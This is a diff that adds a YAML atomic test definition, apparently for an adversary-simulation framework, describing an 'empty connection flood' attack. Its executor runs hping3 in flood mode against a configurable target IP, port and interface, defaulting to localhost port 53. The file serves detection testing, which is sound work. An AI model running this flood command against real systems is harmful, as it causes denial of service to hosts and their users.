@@ -1,0 +1,31 @@
+attack_technique: empty_connection_flood
+display_name: "Empty connection flood attack"
+category: "Flood"
+atomic_tests:
+- name: "Empty connection flood"
+  description: ""
+  reference: "https://en.wikipedia.org/wiki/Christmas_tree_packet"
+  supported_platforms:
+  - linux
+  input_arguments:
+    target_ip:
+      description: "Target IP"
+      type: String
+      default: 127.0.0.1
+    target_port:
+      description: "Destination port"
+      type: Interger
+      default: 53
+    interface:
+      description: "interface to use"
+      type: String
+      default: eth0
+    extra_args:
+      description: "extra arguments"
+      type: String
+      default: -V -d 120 --flood -c 10
+  executor:
+    command: |
+      hping3 -n -I #{interface} #{extra_args} -p #{target_port} #{target_ip}
+    cleanup_command: ""
+    name: command_prompt
